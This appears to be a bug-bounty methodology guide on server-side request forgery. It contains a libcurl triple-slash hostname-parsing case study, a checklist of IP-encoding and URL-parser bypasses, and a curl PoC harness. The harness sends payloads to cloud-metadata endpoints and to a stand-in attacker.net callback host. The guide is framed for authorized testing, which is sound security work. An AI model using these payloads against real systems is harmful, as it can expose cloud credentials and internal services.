# SSRF — Server-Side Request Forgery (incl. URL-parsing / hostname-confusion vectors)

> When user input influences a **server-side outbound request** — URL, host,
> path appended to a base URL, redirect target, or URL-parsed hostname — the
> server can be made to reach internal/cloud-metadata resources it must not.
> A single class: **the server trusts attacker controls for where it connects.**
> Use at P3/P4. Taxonomy: CWE-918. OWASP API1/BOLA context; SSRF is often the
> vehicle that turns an object-access flaw into internal access.

---

## 1. Why it matters in 2026

Two modern SSRF accelerators:
1. **Metadata endpoints** — `169.254.169.254/latest/meta-data/` (AWS),
   `metadata.google.internal`, `169.254.169.254` (GCP/Azure) — cloud IAM
   credentials via one HTTP GET.
2. **URL-parsing inconsistencies** — the *library that parses the URL* decides
   the host, and different parsers disagree (triple-slash, backslash, dot,
   `%00`, Unicode). A server that validates the *string* but not the *parsed
   host* can be tricked because **encode/parse differs from the parser that
   executes the request**.

Grep for: `urlopen`, `fetch`, `WebClient`, `RestClient`, `request`, `redirect`,
`proxy`, `webhook`, `import`, `render.*url`, `curl`, `get(url)`, `axios.get(var)`.

---

## 2. Proven case study (real, disclosed 2026)

### #3923212 — curl · URL API triple-slash parses path segment as hostname (SSRF to metadata)
- **Reported:** 2026-08 (seed) · program **curl** · disclosure pending at time of capture
- **Vector (verbatim):** `curl_url_get(CURLUPART_HOST)` misparses `http:///host/path`.
  Per RFC 3986 the authority between `//` and `/` is empty, so `/host/path` is the
  **path**. But `parseurl()` in `lib/urlapi.c` treats the first segment **after the
  third slash as the hostname**:
  ```
  http:///169.254.169.254/latest/meta-data/  →  host="169.254.169.254", path="/latest/meta-data/"
  ```
  Expected: empty authority, path=`/169.254.169.254/latest/meta-data/`.
- **Impact:** an app that builds URLs from user input and validates only the
  **parsed hostname** (`curl_url_get(..., CURLUPART_HOST)`) can be tricked into
  requesting attacker-chosen hosts — **SSRF to cloud metadata endpoints**.
- **Affected:** libcurl 8.5.0 (default "Url parsing earlier"), 8.21.0 (latest),
  confirmed on both. Root cause: slash-counter reaches 3 (accepted 1-3 range) so
  `hostp` = whatever follows the third slash.
- **Link:** `https://hackerone.com/reports/3923212`

> Takeaway for bug-hunting: even a *libraries* URL parser has a hostname/path
> confusion that enables SSRF when an app later builds a request from
> user-appended path. Test **odd slash counts / backslash / leading dots**
> against whatever URL library the target uses, and see what the **routing
> layer** treats as the host.

---

## 3. Detection checklist (P2/P3)

- [ ] Find every endpoint taking a **URL/host/path** parameter that the server
      fetches: `?url=`, `?redirect=`, `?next=`, `?path=`, `?document=`, `?import=`,
      webhook/avatar/scrape/render/web-cache endpoints.
- [ ] Classify SSRF type:
      - **basic** — server fetches the supplied URL directly
      - **partial** — app appends path to a fixed base (`curl https://api.x.com/`+user) → test **slash / dot / triple-slash** tricks (#3923212 pattern)
      - **blind** — no body echo, detect via out-of-band DNS/log.
      - **redirect-based** — server follows the first URL's redirect.
- [ ] Test non-supplied-host bypasses: `127.0.0.1`, `localhost`, internal IPs,
      DNS-rebinding trick, alternate-hostname dodges (decimal/hex IP, `2130706433`,
      `0x7f000001`), merging IP (e.g. `http://2130706433/`).
- [ ] If a allowlist exists, test **URL-parse gadgets**: trailing `.`, `@`,
      backslash, `%00` null injection, `#` fragment as separator, double-encoding,
      mixed slash/backslash — whichever the **routing** parser normalizes.
- [ ] SSRF via **metadata**: `http://169.254.169.254/latest/meta-data/iam/`,
      `http://metadata.google.internal/computeMetadata/v1/` (needs
      `Metadata-Flavor: Google`), cloud credential endpoint → **highest impact**.
- [ ] OOB: run a controlled listener/DNS (vhs OOB pattern) to confirm requests
      leave the target to a host you own — use a unique token per test.

---

## 4. PoC harness (read-only / controlled, authorized target only)

```bash
# 1. benign — does the endpoint make an outbound request at all?
curl -s -X POST "https://TARGET/api/render/screenshot" \
  -d '{"url":"https://YOUR-OOB-TOKEN.attacker.net/"}'
#   ^ check your listener/DNS for a hit (OOB confirmation = blind SSRF)

# 2. internal probe — smallest proof, no data exfil
curl -s -X POST "https://TARGET/api/render/screenshot" \
  -d '{"url":"http://127.0.0.1/health"}'     # compare vs google.com (different status/body)

# 3. metadata (AUTHORIZED ONLY, never exfiltrate IAM creds)
curl -s -X POST "https://TARGET/api/render/screenshot" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  -o /data/metadata-proof    # capture isolation/status only, do not read/store secrets

# 4. URL-parser gadget (app validates parsed host but routes raw) — #3923212 pattern
curl -s -X POST "https://TARGET/api/render/screenshot" \
  -d '{"url":"http:///169.254.169.254/latest/meta-data/"}' \
  -o /data/parser-proof
```

**RoE:** proof = the **request happens** (OOB callback sighting, status/http-vs-internal
difference). **Never** extract or store cloud-metadata credentials; never use SSRF to
reach resources not needed for the proof. Document baseline / expected control /
negative control (an external benign URL should be the only reachable target).

---

## 5. Severity

- **SSRF → cloud metadata (IAM credential leak)** → Critical.
- **Internal-network SSRF (reach services/ports)** → High.
- **Blind SSRF (OOB only confirmed)** → Medium (often High with internal reach).
- **URL-parser confusion → metadata** → High; report the specific vector (e.g.
  #3923212 triple-slash) with the exact parser + affected version.
- Cite: CWE-918; #3923212 for URL-parsing SSRF.